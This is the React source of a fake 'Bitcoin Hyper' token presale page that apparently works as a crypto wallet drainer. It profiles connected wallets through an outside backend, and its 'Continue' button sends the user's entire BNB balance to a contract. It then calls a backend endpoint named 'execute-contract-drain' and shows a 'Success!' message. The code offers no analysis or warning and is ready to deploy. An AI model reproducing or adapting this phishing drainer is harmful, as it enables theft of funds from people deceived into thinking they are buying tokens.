import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useBalance, useDisconnect } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

const PRESALE_CONFIG = {
  BSC: {
    chainId: 56,
    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    deployed: true
  }
};

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { chainId } = useAppKitNetwork();
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [allBalances, setAllBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [eligible, setEligible] = useState(false);

  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
    chainId: chainId,
  });

  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
    }
  }, [balanceData]);

  useEffect(() => {
    const initProvider = async () => {
      if (isConnected && window.ethereum) {
        try {
          const web3Provider = new ethers.BrowserProvider(window.ethereum);
          setProvider(web3Provider);
          const web3Signer = await web3Provider.getSigner();
          setSigner(web3Signer);
          console.log('✅ Signer ready');
        } catch (err) {
          console.error('Provider error:', err);
        }
      }
    };
    initProvider();
  }, [isConnected]);

  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    
    try {
      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setEligible(data.data.isEligible);
        
        if (data.data.rawData) {
          const balances = {};
          data.data.rawData.forEach(item => {
            balances[item.chain] = {
              amount: item.amount,
              valueUSD: item.valueUSD,
              symbol: item.symbol
            };
          });
          setAllBalances(balances);
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
    } finally {
      setVerifying(false);
    }
  };

  const executePresaleTransaction = async () => {
    if (!signer || !address) {
      setError('Please reconnect your wallet');
      return;
    }

    if (chainId !== 56) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        });
        return;
      } catch (err) {
        setError('Please switch to BSC network');
        return;
      }
    }

    if (parseFloat(balance) <= 0) {
      setError('Insufficient balance');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('⏳ Please confirm in your wallet...');
      setTxHash('');

      const contract = new ethers.Contract(
        PRESALE_CONFIG.BSC.contractAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      const value = ethers.parseEther(balance);
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n
      });

      setTxHash(tx.hash);
      setTxStatus('✅ Transaction submitted!');

      await tx.wait();
      
      if (provider) {
        const newBalance = await provider.getBalance(address);
        setBalance(formatEther(newBalance));
        refetchBalance?.();
      }
      
      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          chainName: 'BSC'
        })
      });
      
      setShowCelebration(true);
      setTxStatus(`🎉 Congratulations!`);
      
    } catch (err) {
      console.error('Transaction error:', err);
      setError(err.code === 4001 ? 'Transaction cancelled' : 'Transaction failed');
      setTxStatus('❌ Failed');
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const switchToBSC = async () => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }]
      });
    } catch (err) {
      setError('Please switch to BSC manually');
    }
  };

  const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + b.valueUSD, 0);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-4xl relative z-10">
        
        <div className="text-center mb-12">
          <div className="inline-block mb-6">
            <div className="text-7xl animate-bounce-slow">₿</div>
          </div>
          <h1 className="text-6xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-xl">Next Generation Layer 2 Solution</p>
        </div>

        {/* Connect Wallet */}
        <div className="text-center mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="group relative transform hover:scale-105 transition-all duration-300"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
              <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
                Connect Wallet
              </div>
            </button>
          ) : (
            <div className="glass-card p-6">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                    {formatAddress(address)}
                  </span>
                </div>
                <button
                  onClick={() => disconnect()}
                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {verifying && (
          <div className="glass-card p-8 mb-6 text-center">
            <div className="flex flex-col items-center gap-4">
              <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="text-xl text-gray-300">Verifying wallet...</p>
            </div>
          </div>
        )}

        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm animate-shake">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>{error}</span>
            </div>
          </div>
        )}

        {txStatus && !verifying && (
          <div className="glass-card p-4 mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
              >
                View Transaction ↗
              </a>
            )}
          </div>
        )}

        {isConnected && !verifying && scanResult && (
          <div className="glass-card p-8 text-center">
            {eligible ? (
              <>
                <div className="mb-8">
                  <h2 className="text-3xl font-bold mb-4">Welcome!</h2>
                  <p className="text-gray-400">Your wallet has been verified</p>
                  
                  {/* Show balances if available */}
                  {Object.keys(allBalances).length > 0 && (
                    <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
                      {Object.entries(allBalances).map(([chain, data]) => (
                        <div key={chain} className="bg-gray-800/50 p-4 rounded-lg border border-gray-700">
                          <div className="text-2xl mb-2">{chain === 'BSC' ? '🟡' : '🔷'}</div>
                          <p className="text-orange-400 font-bold">{data.amount.toFixed(4)} {data.symbol}</p>
                          <p className="text-sm text-gray-400">${data.valueUSD.toFixed(2)}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                {chainId !== 56 ? (
                  <button
                    onClick={switchToBSC}
                    className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
                  >
                    Switch to BSC
                  </button>
                ) : (
                  <button
                    onClick={executePresaleTransaction}
                    disabled={loading}
                    className="w-full group relative"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      {loading ? 'Processing...' : '⚡ Continue'}
                    </div>
                  </button>
                )}
              </>
            ) : (
              <div className="py-12">
                <div className="text-6xl mb-6">👋</div>
                <h2 className="text-3xl font-bold mb-4">Welcome!</h2>
                <p className="text-gray-400 text-lg mb-4">
                  Your wallet has been successfully connected
                </p>
                <div className="max-w-md mx-auto bg-gray-800/50 p-6 rounded-xl border border-gray-700">
                  <p className="text-gray-300">
                    Thank you for connecting your wallet. Our team reviews each connection 
                    to ensure platform security and prevent automated access.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
              <div className="text-center">
                <div className="text-8xl mb-6 animate-bounce">🎉</div>
                <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Success!
                </h2>
                <p className="text-xl text-gray-300 mb-6">
                  Your participation has been recorded
                </p>
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        )}

        <div className="mt-12 text-center text-gray-500 text-sm">
          <p>© 2026 Bitcoin Hyper. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
}

export default App;
